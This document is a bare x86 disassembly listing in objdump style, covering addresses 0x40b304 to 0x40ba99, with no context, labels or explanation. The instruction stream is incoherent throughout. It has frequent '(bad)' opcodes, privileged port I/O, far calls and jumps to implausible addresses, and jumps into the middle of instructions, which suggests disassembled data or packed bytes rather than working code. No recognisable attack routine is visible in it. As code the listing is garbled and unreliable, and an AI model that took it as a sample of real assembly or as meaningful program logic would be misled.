  40b304:	xchg   DWORD PTR [eax],ebx
  40b306:	mov    DWORD PTR [ebp+0x5e],ebx
  40b309:	les    ecx,FWORD PTR [ecx-0x52]
  40b30c:	and    eax,0x4a2faa3
  40b311:	adc    bl,BYTE PTR [ebx]
  40b313:	and    BYTE PTR [edx+0x3904c865],bh
  40b319:	and    DWORD PTR gs:[ebp-0x716f486a],ecx
  40b320:	js     0x40b314
  40b322:	push   0xffffff9a
  40b324:	mov    al,ds:0x2365412b
  40b329:	rol    DWORD PTR [edi-0x66678dde],0xc9
  40b330:	xchg   edx,esp
  40b332:	arpl   WORD PTR [edi-0x35521876],cx
  40b338:	xchg   ecx,eax
  40b339:	rcl    BYTE PTR [ecx],1
  40b33b:	jp     0x40b38d
  40b33d:	daa    
  40b33e:	fmul   QWORD PTR [ebp+0x26637043]
  40b344:	mov    bl,0x92
  40b346:	inc    edi
  40b347:	mov    BYTE PTR [esi-0x28],0xca
  40b34b:	imul   esp,DWORD PTR [edi+0x70],0xe67b2dbb
  40b352:	icebp  
  40b353:	lds    ebp,FWORD PTR [ebp-0xd3c1e8d]
  40b359:	jo     0x40b310
  40b35b:	sub    esi,ebp
  40b35d:	in     eax,dx
  40b35e:	jecxz  0x40b2e6
  40b360:	mov    ah,0xd9
  40b362:	or     DWORD PTR [esi+0x57],edi
  40b365:	pop    ss
  40b366:	out    dx,eax
  40b367:	mov    dh,BYTE PTR [edi+0x33]
  40b36a:	xlat   BYTE PTR ds:[ebx]
  40b36b:	leave  
  40b36c:	test   al,0xd1
  40b36e:	xchg   ebp,eax
  40b36f:	jb     0x40b3b1
  40b371:	gs dec edx
  40b373:	mov    dl,BYTE PTR [edi-0x27]
  40b376:	sbb    dl,ch
  40b378:	add    cl,ch
  40b37a:	and    ebx,DWORD PTR [edi+0x6c93c86b]
  40b380:	fwait
  40b381:	cs adc al,0xfd
  40b384:	mov    ah,BYTE PTR [edx*8-0x36b36eb0]
  40b38b:	sbb    esp,esi
  40b38d:	mov    dl,BYTE PTR [eax+0x6a031207]
  40b393:	cmp    DWORD PTR [eax+edx*1+0x20],eax
  40b397:	iret   
  40b398:	hlt    
  40b399:	repz mov ds:0xb7a86738,al
  40b39f:	xchg   edx,eax
  40b3a0:	push   0xd4a53d5a
  40b3a5:	popf   
  40b3a6:	mov    bl,0x1b
  40b3a8:	sbb    al,0xa8
  40b3aa:	xor    al,0x7b
  40b3ac:	pop    edx
  40b3ad:	mov    eax,0x14fd3143
  40b3b2:	mov    ah,0x18
  40b3b4:	outs   dx,BYTE PTR ds:[esi]
  40b3b5:	loop   0x40b397
  40b3b7:	rcl    DWORD PTR ds:[ecx],cl
  40b3ba:	adc    DWORD PTR [edi-0x1376fa05],ebp
  40b3c0:	nop
  40b3c1:	imul   edx,DWORD PTR [eax+0x49],0x46
  40b3c5:	test   bh,al
  40b3c7:	cld    
  40b3c8:	jmp    0x8b48f958
  40b3cd:	dec    ebp
  40b3ce:	clc    
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x8bec8d67
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	jl     0x40b41f
  40b3f2:	xchg   esp,eax
  40b3f3:	xchg   ebp,eax
  40b3f4:	push   ecx
  40b3f5:	sbb    ah,dl
  40b3f7:	pop    eax
  40b3f8:	hlt    
  40b3f9:	push   edx
  40b3fa:	add    esp,ecx
  40b3fc:	pop    ecx
  40b3fd:	add    ch,BYTE PTR [esi]
  40b3ff:	loop   0x40b460
  40b401:	imul   edx,DWORD PTR [edx+0x11],0x47
  40b405:	mov    ch,0xc4
  40b407:	mov    ebx,0x33c0272
  40b40c:	push   eax
  40b40d:	xchg   esi,eax
  40b40e:	stc    
  40b40f:	cmp    BYTE PTR [eax-0x1b],ch
  40b412:	mov    dl,0x56
  40b414:	mov    ebp,0x8a3d3
  40b419:	call   0x13eb:0xd9b308d
  40b420:	mov    ah,bh
  40b422:	scas   al,BYTE PTR es:[edi]
  40b423:	jecxz  0x40b493
  40b425:	fsubrp st(7),st
  40b427:	rcr    DWORD PTR [esi-0x38],0xd2
  40b42b:	adc    eax,0xae07d8c2
  40b431:	retf   0xf0cc
  40b434:	dec    ebx
  40b435:	aad    0xde
  40b437:	fst    QWORD PTR [ebp+0x1d]
  40b43a:	rcr    edi,1
  40b43c:	dec    ebp
  40b43d:	add    BYTE PTR [esi+0x72],0x67
  40b441:	mov    al,0x15
  40b443:	popf   
  40b444:	jl     0x40b3d9
  40b446:	ret    
  40b447:	into   
  40b448:	mov    ds:0x640cc88a,al
  40b44d:	in     al,dx
  40b44e:	pop    es
  40b44f:	ret    0xbcae
  40b452:	out    dx,al
  40b453:	jnp    0x40b4a1
  40b455:	or     DWORD PTR [esi],ecx
  40b457:	std    
  40b458:	mov    ds:0xaf393781,eax
  40b45d:	pop    ebx
  40b45e:	fcomip st,st(7)
  40b460:	mov    ds:0x24a201d2,al
  40b465:	mov    dh,0x76
  40b467:	xchg   ebp,eax
  40b468:	jg     0x40b458
  40b46a:	aam    0x1b
  40b46c:	jge    0x40b450
  40b46e:	lea    esi,[ecx+0x62757df1]
  40b474:	data16 xor al,0x40
  40b477:	cs jl  0x40b3fa
  40b47a:	popf   
  40b47b:	xor    al,0xc5
  40b47d:	idiv   DWORD PTR [ebx+esi*4-0xec2a36b]
  40b484:	leave  
  40b485:	inc    ecx
  40b486:	out    dx,al
  40b487:	jbe    0x40b4a3
  40b489:	rcl    DWORD PTR [ecx+esi*1+0x12e86081],0x3b
  40b491:	mov    edi,0xf59389c2
  40b496:	xor    edx,ebx
  40b498:	dec    ebp
  40b499:	mov    ebx,0xae4b3650
  40b49e:	sbb    ebp,DWORD PTR [ebx-0x215a8f96]
  40b4a4:	inc    esp
  40b4a5:	div    ebx
  40b4a7:	into   
  40b4a8:	jo     0x40b506
  40b4aa:	add    BYTE PTR [eax-0x488d35f0],al
  40b4b0:	add    al,0xb8
  40b4b2:	aas    
  40b4b3:	push   eax
  40b4b4:	pop    edi
  40b4b5:	test   BYTE PTR [esi-0x3889e822],0x40
  40b4bc:	jecxz  0x40b46a
  40b4be:	and    esi,edi
  40b4c0:	xor    edx,esi
  40b4c2:	adc    BYTE PTR [edi+0x67ee7027],al
  40b4c8:	lods   al,BYTE PTR ds:[esi]
  40b4c9:	(bad)  
  40b4ca:	(bad)  
  40b4cc:	mov    eax,DWORD PTR [ebx-0x5b]
  40b4cf:	loop   0x40b4c9
  40b4d1:	jl     0x40b4f0
  40b4d3:	fst    DWORD PTR [edx*1-0x44c1abe9]
  40b4da:	mov    dl,0xd
  40b4dc:	push   esi
  40b4dd:	xchg   edx,eax
  40b4de:	push   esi
  40b4df:	mov    cl,0xbf
  40b4e1:	leave  
  40b4e2:	sub    ah,BYTE PTR [esi-0x1b]
  40b4e5:	push   edx
  40b4e6:	jle    0x40b4dc
  40b4e8:	jne    0x40b493
  40b4ea:	and    eax,0xdbf09597
  40b4ef:	aaa    
  40b4f0:	call   0x3f26f606
  40b4f5:	sbb    BYTE PTR [eax],dl
  40b4f7:	and    ecx,eax
  40b4f9:	sar    BYTE PTR [ebp+0x50c226fd],cl
  40b4ff:	or     bh,ch
  40b501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b502:	(bad)
  40b506:	jle    0x40b4db
  40b508:	xchg   ebx,eax
  40b509:	dec    ebx
  40b50a:	mov    DWORD PTR [edi-0x2e],ebx
  40b50d:	cmp    edi,esi
  40b50f:	scas   al,BYTE PTR es:[edi]
  40b510:	cmp    DWORD PTR [eax],edx
  40b512:	fst    DWORD PTR [ebp+0x4d]
  40b515:	jb     0x40b4e8
  40b517:	in     al,0x36
  40b519:	dec    eax
  40b51a:	in     eax,dx
  40b51b:	test   al,0x74
  40b51d:	sbb    ch,BYTE PTR [ebx-0x3626f3f5]
  40b523:	enter  0x34f7,0xb1
  40b527:	sbb    edi,DWORD PTR [eax-0x562eb8f0]
  40b52d:	jno    0x40b594
  40b52f:	sub    al,0x70
  40b531:	loop   0x40b591
  40b533:	leave  
  40b534:	cdq    
  40b535:	jo     0x40b4fa
  40b537:	cmc    
  40b538:	xchg   ecx,ecx
  40b53a:	and    bh,BYTE PTR ds:0x85981de
  40b540:	aam    0xe1
  40b542:	call   0x9a1d:0x7b5e22b
  40b549:	repz call 0xbbd0:0x4c7df42b
  40b551:	mov    ebp,0x68b3880a
  40b556:	shl    BYTE PTR [edi],1
  40b558:	xlat   BYTE PTR ds:[ebx]
  40b559:	icebp  
  40b55a:	push   ebx
  40b55b:	add    al,0xe7
  40b55d:	shl    DWORD PTR [edx-0xe],0x30
  40b561:	sbb    dl,BYTE PTR [esi-0x7c33fdd6]
  40b567:	scas   eax,DWORD PTR es:[edi]
  40b568:	xchg   esp,eax
  40b569:	out    0xab,eax
  40b56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b56c:	sbb    BYTE PTR [esi+0x7ce786b6],al
  40b572:	xchg   BYTE PTR [edx+0x4],dl
  40b575:	jno    0x40b5f5
  40b577:	inc    esi
  40b578:	rcr    ah,0xe0
  40b57b:	pop    ecx
  40b57c:	shl    DWORD PTR ss:[esi+0x71],0x43
  40b581:	je     0x40b5e5
  40b583:	lahf   
  40b584:	and    DWORD PTR [edx],0x49c87fa5
  40b58a:	lea    ebx,[edx+0x51eeeb90]
  40b590:	ss push eax
  40b592:	out    0x99,al
  40b594:	rdpmc  
  40b596:	mov    ebp,0x2f11e691
  40b59b:	and    esi,DWORD PTR [edi+0x59]
  40b59e:	retf   
  40b59f:	popa   
  40b5a0:	pop    ds
  40b5a1:	lea    eax,fs:[ebp-0x2f]
  40b5a5:	dec    ecx
  40b5a6:	adc    eax,0xc7d106da
  40b5ab:	ins    DWORD PTR es:[edi],dx
  40b5ac:	push   ebp
  40b5ad:	mov    ebp,0xc1740063
  40b5b2:	sahf   
  40b5b3:	jnp    0x40b57c
  40b5b5:	outs   dx,BYTE PTR ds:[esi]
  40b5b6:	scas   al,BYTE PTR es:[edi]
  40b5b7:	cdq    
  40b5b8:	sub    eax,0x93b4fe7c
  40b5bd:	mov    eax,DWORD PTR [eax+edx*2]
  40b5c0:	aad    0x78
  40b5c2:	fwait
  40b5c3:	hlt    
  40b5c4:	aad    0x66
  40b5c6:	jbe    0x40b568
  40b5c8:	aam    0xcf
  40b5ca:	or     DWORD PTR [ecx],ebx
  40b5cc:	xchg   ebp,eax
  40b5cd:	shr    BYTE PTR [ebx],1
  40b5cf:	(bad)  
  40b5d0:	or     al,0x1a
  40b5d2:	fwait
  40b5d3:	mov    ebx,ds
  40b5d5:	xchg   ebx,eax
  40b5d6:	in     al,dx
  40b5d7:	stos   DWORD PTR es:[edi],eax
  40b5d8:	jns    0x40b656
  40b5da:	cmp    cl,0x80
  40b5dd:	adc    dl,BYTE PTR ds:0x6026ebb
  40b5e3:	rol    BYTE PTR [ebx],0xa9
  40b5e6:	(bad)  
  40b5e7:	sahf   
  40b5e8:	pop    es
  40b5e9:	fwait
  40b5ea:	js     0x40b5d2
  40b5ec:	jle    0x40b649
  40b5ee:	and    ebx,eax
  40b5f0:	or     cl,BYTE PTR ds:0x4e37ab93
  40b5f6:	test   DWORD PTR [ebx+0x30],esp
  40b5f9:	fcmovnb st,st(1)
  40b5fb:	daa    
  40b5fc:	fnsave gs:[edx+0x4b]
  40b600:	inc    edx
  40b601:	sbb    DWORD PTR [edi],edx
  40b603:	jae    0x40b615
  40b605:	fldenv [esi+ebx*4+0x76d24057]
  40b60c:	jge    0x40b621
  40b60e:	(bad)  
  40b60f:	pop    esi
  40b610:	cdq    
  40b611:	(bad)  
  40b612:	push   0xc7e8015d
  40b617:	dec    ebp
  40b618:	and    eax,0xf32c65b4
  40b61d:	sub    edi,DWORD PTR [ebx+0x11]
  40b620:	lahf   
  40b621:	idiv   edx
  40b623:	xor    al,0xe5
  40b625:	push   ebp
  40b626:	cmp    bh,BYTE PTR [ecx+0x53]
  40b629:	(bad)  
  40b62a:	mov    dl,0x41
  40b62c:	adc    DWORD PTR [esi-0x71572fef],edi
  40b632:	xor    ch,al
  40b634:	mov    bh,0x3e
  40b636:	xor    al,0x13
  40b638:	jp     0x40b6ab
  40b63a:	pop    edx
  40b63b:	imul   edx,DWORD PTR [edx+0x4e50e44],0xffffff92
  40b642:	dec    ecx
  40b643:	adc    edx,DWORD PTR [edx-0x42]
  40b646:	iret   
  40b647:	loopne 0x40b66f
  40b649:	sti    
  40b64a:	and    al,0x49
  40b64c:	mov    ch,bl
  40b64e:	mov    ebx,0xcfd31ac8
  40b653:	mov    ds:0xa0716226,al
  40b658:	psraw  mm6,QWORD PTR [ebp-0x717e4b38]
  40b65f:	dec    esp
  40b660:	jbe    0x40b65d
  40b662:	(bad)  [ecx-0x15b20ea0]
  40b668:	inc    esi
  40b669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b66a:	popf   
  40b66b:	sbb    eax,DWORD PTR [esp+ebp*2]
  40b66e:	xchg   edx,eax
  40b66f:	xchg   ecx,eax
  40b670:	mov    edi,0x323627e2
  40b675:	mov    cl,0xc7
  40b677:	mov    edi,0x9f6a58e9
  40b67c:	mov    ch,0x91
  40b67e:	jp     0x40b6c5
  40b680:	cvtpi2ps xmm3,QWORD PTR es:[eax]
  40b684:	stos   BYTE PTR es:[edi],al
  40b685:	clc    
  40b686:	push   edi
  40b687:	mov    ebx,0xbaae241e
  40b68c:	xor    ebp,DWORD PTR [ebp-0x31]
  40b68f:	std    
  40b690:	in     al,dx
  40b691:	jno    0x40b6e4
  40b693:	(bad)  
  40b694:	pushf  
  40b695:	sbb    al,0x69
  40b697:	or     al,0x34
  40b699:	jnp    0x40b691
  40b69b:	(bad)
  40b69f:	shr    edi,0x8d
  40b6a2:	mov    esp,0x7efeb57e
  40b6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6a8:	sub    dl,ch
  40b6aa:	inc    ebp
  40b6ab:	and    cl,BYTE PTR ds:0xb58da7b5
  40b6b1:	and    eax,0x1fd2e014
  40b6b6:	into   
  40b6b7:	shl    BYTE PTR [ebp+0x57b8f689],0x59
  40b6be:	fdiv   st,st(0)
  40b6c0:	pop    edx
  40b6c1:	out    0xaa,eax
  40b6c3:	mov    edi,0x3b64256f
  40b6c8:	pop    esp
  40b6c9:	test   al,0x90
  40b6cb:	xchg   esi,eax
  40b6cc:	stos   BYTE PTR es:[edi],al
  40b6cd:	add    cl,dl
  40b6cf:	or     al,BYTE PTR [ecx]
  40b6d1:	jmp    0x4f36a8a0
  40b6d6:	(bad)  
  40b6d7:	ins    BYTE PTR es:[edi],dx
  40b6d8:	pop    esi
  40b6d9:	hlt    
  40b6da:	mov    eax,0x613820bd
  40b6df:	jmp    0x40b661
  40b6e1:	and    cl,BYTE PTR [esi-0x28c0bd10]
  40b6e7:	aad    0x5c
  40b6e9:	pop    ds
  40b6ea:	or     DWORD PTR [edx-0x142e0a0a],edx
  40b6f0:	jmp    0x40b724
  40b6f2:	mov    esp,0xe90189ce
  40b6f7:	xchg   DWORD PTR [ecx],ecx
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    eax,es
  40b719:	(bad)  
  40b71a:	xchg   ecx,eax
  40b71b:	dec    ebp
  40b71c:	adc    al,0xf8
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	(bad)  [ebx+0x3953f5fd]
  40b72a:	scas   eax,DWORD PTR es:[edi]
  40b72b:	add    DWORD PTR ds:0x564a6d59,0x5214a31
  40b735:	lahf   
  40b736:	cld    
  40b737:	pop    esi
  40b738:	xor    DWORD PTR [eax],0x50
  40b73b:	or     dl,BYTE PTR [ecx]
  40b73d:	mov    ebx,0xfc6b5eca
  40b742:	or     DWORD PTR [ecx],ecx
  40b744:	int    0x76
  40b746:	gs add edx,DWORD PTR es:[ebp+ebp*8+0x4e]
  40b74c:	and    edi,eax
  40b74e:	call   0x68ff508b
  40b753:	sub    esp,0xd749b3ca
  40b759:	xor    dl,BYTE PTR cs:0x342830e
  40b760:	add    al,0x21
  40b762:	or     eax,0xec6715b2
  40b767:	addr16 (bad) 
  40b76a:	sub    esp,esp
  40b76c:	cdq    
  40b76d:	cmp    DWORD PTR [edi-0x6],0x3e
  40b771:	mov    cl,BYTE PTR [edi+0x20]
  40b774:	mov    ecx,0x56037736
  40b779:	neg    BYTE PTR [edi]
  40b77b:	data16 add BYTE PTR [ebx],ch
  40b77e:	repnz add eax,0x3e36e310
  40b784:	inc    edi
  40b785:	call   0x8ffe8a68
  40b78a:	cwde   
  40b78b:	mov    eax,ds:0xf2c9ecd6
  40b790:	or     dh,cl
  40b792:	retf   
  40b793:	pop    eax
  40b794:	push   ss
  40b795:	sub    bh,BYTE PTR [eiz*4-0x4457c238]
  40b79c:	shl    dl,0xc0
  40b79f:	cmp    DWORD PTR [ecx+0x10918abf],edx
  40b7a5:	out    0x5f,al
  40b7a7:	or     al,0xeb
  40b7a9:	addr16 cmp cl,dl
  40b7ac:	fbstp  TBYTE PTR ds:0xabfa3fb9
  40b7b2:	jecxz  0x40b7d9
  40b7b4:	sbb    DWORD PTR [edx],0xffffffb2
  40b7b7:	jmp    0x8ff96ac0
  40b7bc:	int3   
  40b7bd:	inc    esi
  40b7be:	push   edi
  40b7bf:	out    dx,al
  40b7c0:	jno    0x40b7e3
  40b7c2:	adc    DWORD PTR [ecx-0x657f0c76],0xf984e2bb
  40b7cc:	or     eax,0x4066646d
  40b7d1:	lahf   
  40b7d2:	nop
  40b7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d4:	and    eax,0x72388e6f
  40b7d9:	pop    ss
  40b7da:	leave  
  40b7db:	mov    esp,0x37c7ffb3
  40b7e0:	test   DWORD PTR [ecx+0x3e0f13f2],0x764db15e
  40b7ea:	xlat   BYTE PTR ds:[ebx]
  40b7eb:	push   edx
  40b7ec:	and    ch,BYTE PTR [edi+0x3a789899]
  40b7f2:	in     eax,dx
  40b7f3:	xchg   ebp,eax
  40b7f4:	sbb    ebx,DWORD PTR [esi+0x77]
  40b7f7:	mov    bh,0x6a
  40b7f9:	and    BYTE PTR [esi+ecx*2],bl
  40b7fc:	or     DWORD PTR [eax+0x780cd168],0xfeefdda0
  40b806:	repz cdq 
  40b808:	mov    edi,0x5b542d19
  40b80d:	push   esi
  40b80e:	add    BYTE PTR [ecx-0x2],ch
  40b811:	scas   al,BYTE PTR es:[edi]
  40b812:	enter  0x49e5,0xe7
  40b816:	das    
  40b817:	fiadd  DWORD PTR [edi-0x43]
  40b81a:	inc    edx
  40b81b:	ror    DWORD PTR [ecx],1
  40b81d:	fwait
  40b81e:	push   0x4429207b
  40b823:	sar    cl,1
  40b825:	adc    dl,0x1b
  40b828:	pop    esi
  40b829:	sub    ebx,DWORD PTR [ebx-0x5e]
  40b82c:	in     eax,dx
  40b82d:	sbb    bh,0x54
  40b830:	inc    esi
  40b831:	scas   eax,DWORD PTR es:[edi]
  40b832:	sbb    DWORD PTR [ebp-0x7ef99a08],ebp
  40b838:	mov    eax,ds:0x9d67de9
  40b83d:	jmp    0xda2b:0x967a3c6f
  40b844:	and    BYTE PTR [edi],dl
  40b846:	mov    dh,0x67
  40b848:	test   DWORD PTR [edi+0xf2b9c43],esp
  40b84e:	xor    al,0xf2
  40b850:	jnp    0x40b864
  40b852:	lods   al,BYTE PTR ds:[esi]
  40b853:	jge    0x40b835
  40b855:	cmp    cl,BYTE PTR [edi-0x3c3d1a91]
  40b85b:	adc    al,BYTE PTR [edi]
  40b85d:	fcmovbe st,st(3)
  40b85f:	loope  0x40b8a5
  40b861:	lods   al,BYTE PTR ds:[esi]
  40b862:	or     al,0xeb
  40b864:	sub    eax,0xacd4f322
  40b869:	shl    ebp,0x1
  40b86c:	mov    dl,0x50
  40b86e:	call   0xd70a4723
  40b873:	sti    
  40b874:	test   BYTE PTR [edx+0x4e],dh
  40b877:	scas   al,BYTE PTR es:[edi]
  40b878:	mov    eax,ds:0x889eb689
  40b87d:	mov    esi,0x727c9274
  40b882:	leave  
  40b883:	jnp    0x40b857
  40b885:	mov    eax,0x7bbd2eaa
  40b88a:	test   eax,0xa9006281
  40b88f:	xor    al,0x92
  40b891:	jp     0x40b8d4
  40b893:	xlat   BYTE PTR ds:[ebx]
  40b894:	sti    
  40b895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b897:	and    BYTE PTR [ecx+0x1a934718],dh
  40b89d:	punpckldq mm6,DWORD PTR [ebx-0x79107410]
  40b8a4:	cmp    edi,eax
  40b8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8a7:	jecxz  0x40b8aa
  40b8a9:	mov    bh,0x63
  40b8ab:	and    al,0x14
  40b8ad:	dec    edx
  40b8ae:	add    ecx,eax
  40b8b0:	cmc    
  40b8b1:	loop   0x40b8e8
  40b8b3:	jecxz  0x40b886
  40b8b5:	cld    
  40b8b6:	jmp    DWORD PTR [eax-0x662aecff]
  40b8bc:	pop    ecx
  40b8bd:	sub    ch,ah
  40b8bf:	or     cl,0x44
  40b8c2:	pop    esi
  40b8c3:	inc    ebp
  40b8c4:	dec    esp
  40b8c5:	xor    ecx,0xffffffae
  40b8c8:	jnp    0x40b8dc
  40b8ca:	in     al,0xd4
  40b8cc:	xor    ebx,DWORD PTR [edx]
  40b8ce:	mov    dl,0xff
  40b8d0:	pop    eax
  40b8d1:	add    al,0xf0
  40b8d3:	push   ecx
  40b8d4:	retf   
  40b8d5:	add    al,0x6e
  40b8d7:	lds    ebx,FWORD PTR [ebx+0x510205e9]
  40b8dd:	and    al,0x97
  40b8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8e0:	dec    ebp
  40b8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8e2:	outs   dx,DWORD PTR ds:[esi]
  40b8e3:	jmp    FWORD PTR [eax+ecx*2+0x44264e71]
  40b8ea:	mov    ebp,0x6b2c6dc
  40b8ef:	jp     0x40b877
  40b8f1:	xor    bh,BYTE PTR ds:[edi+edi*2-0x3d]
  40b8f6:	sbb    DWORD PTR [edi],edi
  40b8f8:	add    ecx,DWORD PTR [ebx]
  40b8fa:	dec    ebx
  40b8fb:	pop    esp
  40b8fc:	add    DWORD PTR [edx],ebx
  40b8fe:	xchg   esi,eax
  40b8ff:	int    0x83
  40b901:	cmp    al,0xeb
  40b903:	repnz sub eax,0x8282ebb
  40b909:	dec    ebx
  40b90a:	sbb    BYTE PTR [edx+0x57],bl
  40b90d:	repz push 0xf3115fdb
  40b913:	dec    BYTE PTR [ebp-0x57b59dd5]
  40b919:	push   eax
  40b91a:	std    
  40b91b:	rcl    BYTE PTR [ecx-0x4334b119],0x25
  40b922:	jl     0x40b8c6
  40b924:	add    eax,DWORD PTR [eax+0x79]
  40b927:	or     eax,DWORD PTR [esi+0x1f]
  40b92a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b92b:	daa    
  40b92c:	xchg   ebx,eax
  40b92d:	adc    DWORD PTR [eax],ebp
  40b92f:	add    DWORD PTR [eax+0x6e],0x7a4642c1
  40b936:	stc    
  40b937:	xchg   ecx,eax
  40b938:	stos   BYTE PTR es:[edi],al
  40b939:	sub    al,0x6a
  40b93b:	cld    
  40b93c:	or     al,bh
  40b93e:	sub    esi,DWORD PTR [esi]
  40b940:	in     al,dx
  40b941:	inc    cl
  40b943:	cmp    BYTE PTR [edx+0xb],ah
  40b946:	sub    BYTE PTR [edi-0x6d25a45a],dl
  40b94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b94d:	jbe    0x40b974
  40b94f:	(bad)  [ebx]
  40b951:	shl    DWORD PTR [ecx-0x2f0bdc68],cl
  40b957:	push   0x36c6899f
  40b95c:	pop    ss
  40b95d:	je     0x40b979
  40b95f:	in     eax,0x63
  40b961:	inc    esi
  40b962:	test   DWORD PTR [ebp-0x401d3647],esi
  40b968:	ins    BYTE PTR es:[edi],dx
  40b969:	or     ebx,DWORD PTR [esi-0x71]
  40b96c:	ret    
  40b96d:	sub    BYTE PTR [eax-0x7516bd63],bl
  40b973:	jb     0x40b99b
  40b975:	jmp    0x626ea9ec
  40b97a:	jecxz  0x40b9f9
  40b97c:	popf   
  40b97d:	std    
  40b97e:	(bad)  
  40b97f:	xchg   edi,eax
  40b980:	int3   
  40b981:	jp     0x40b969
  40b983:	jp     0x40b992
  40b985:	jnp    0x40b917
  40b987:	fwait
  40b988:	mov    dl,0xc4
  40b98a:	repz xlat BYTE PTR ds:[ebx]
  40b98c:	push   0x5e6d1b1
  40b991:	mov    ss,WORD PTR [edi]
  40b993:	add    DWORD PTR [ebx+0x69800970],edi
  40b999:	mov    esp,0xe8683c2e
  40b99e:	leave  
  40b99f:	xchg   ah,dh
  40b9a1:	mov    edi,0x66374e5a
  40b9a6:	cli    
  40b9a7:	repnz xor al,0x40
  40b9aa:	xlat   BYTE PTR ds:[ebx]
  40b9ab:	xchg   edi,eax
  40b9ac:	call   0x4afa:0xa9da7424
  40b9b3:	loop   0x40b996
  40b9b5:	xchg   ecx,eax
  40b9b6:	fnstenv [ebx]
  40b9b8:	or     ah,ch
  40b9ba:	in     eax,dx
  40b9bb:	push   0x58
  40b9bd:	inc    esi
  40b9be:	or     DWORD PTR [ebx+0x7a4061f8],esp
  40b9c4:	sub    eax,0xbef41e2e
  40b9c9:	(bad)  
  40b9cb:	jecxz  0x40b9e8
  40b9cd:	dec    edx
  40b9ce:	shr    DWORD PTR ds:[ecx-0x7fbecbff],0x86
  40b9d6:	(bad)  [ebp+ecx*1-0x70]
  40b9da:	neg    DWORD PTR [ecx]
  40b9dc:	xor    ah,ah
  40b9de:	nop
  40b9df:	fucomip st,st(7)
  40b9e1:	ret    
  40b9e2:	xchg   edx,eax
  40b9e3:	repnz mov ds:0x4b2c882c,al
  40b9e9:	add    bh,ch
  40b9eb:	jge    0x40b9c5
  40b9ed:	test   DWORD PTR [ecx+0x38],eax
  40b9f0:	in     al,0xc7
  40b9f2:	aaa    
  40b9f3:	(bad)  
  40b9f4:	icebp  
  40b9f5:	loope  0x40ba2f
  40b9f7:	lods   eax,DWORD PTR ds:[esi]
  40b9f8:	sub    edx,DWORD PTR [edi]
  40b9fa:	mov    esi,0xb263746b
  40b9ff:	push   0xffffffd0
  40ba01:	pop    ecx
  40ba02:	call   0xd0a5:0xd26889d4
  40ba09:	popf   
  40ba0a:	jnp    0x40ba84
  40ba0c:	retf   
  40ba0d:	push   esi
  40ba0e:	mov    ch,0x70
  40ba10:	(bad)  
  40ba12:	hlt    
  40ba13:	adc    ecx,ebx
  40ba15:	dec    esp
  40ba16:	fisub  WORD PTR [edi+0x57]
  40ba19:	pop    ebx
  40ba1a:	lock mov BYTE PTR [eax],cl
  40ba1d:	and    esp,DWORD PTR [eax+0x684220f3]
  40ba23:	inc    ecx
  40ba24:	out    dx,eax
  40ba25:	popa   
  40ba26:	adc    BYTE PTR [ebp-0x75],0x45
  40ba2a:	clc    
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    cl,ch
  40ba40:	jns    0x40ba55
  40ba42:	fwait
  40ba43:	adc    BYTE PTR [edi+0x7d7a7e7e],al
  40ba49:	jle    0x40bac9
  40ba4b:	sbb    al,0xa6
  40ba4d:	(bad)  
  40ba4e:	cmp    al,BYTE PTR [ebp-0xb]
  40ba51:	mov    DWORD PTR gs:[ebp+edi*8+0x70],ebx
  40ba56:	push   0x5a9f278c
  40ba5b:	dec    edi
  40ba5c:	retf   
  40ba5d:	inc    ebx
  40ba5e:	or     bl,ah
  40ba60:	ret    0xffe1
  40ba63:	jbe    0x40ba2b
  40ba65:	mov    dl,ah
  40ba67:	sar    DWORD PTR [edx-0x57ab3538],cl
  40ba6d:	out    dx,eax
  40ba6e:	sub    BYTE PTR [edx],0x8c
  40ba71:	ret    
  40ba72:	repz cli 
  40ba74:	push   es
  40ba75:	outs   dx,DWORD PTR ds:[esi]
  40ba76:	inc    edi
  40ba77:	lock cdq 
  40ba79:	sub    eax,DWORD PTR [ebx+0x20]
  40ba7c:	xchg   ah,dl
  40ba7e:	inc    edx
  40ba7f:	out    dx,eax
  40ba80:	push   0x17
  40ba82:	push   ds
  40ba83:	push   ss
  40ba84:	jmp    0x40bac5
  40ba86:	icebp  
  40ba87:	inc    BYTE PTR ds:[eax+0x4f]
  40ba8b:	inc    ebx
  40ba8c:	test   DWORD PTR [ebx-0x131798a5],edi
  40ba92:	sbb    eax,0xaa01c5ea
  40ba97:	adc    al,0x6d
  40ba99:	mov    ds:0x4bc5c7b8,al
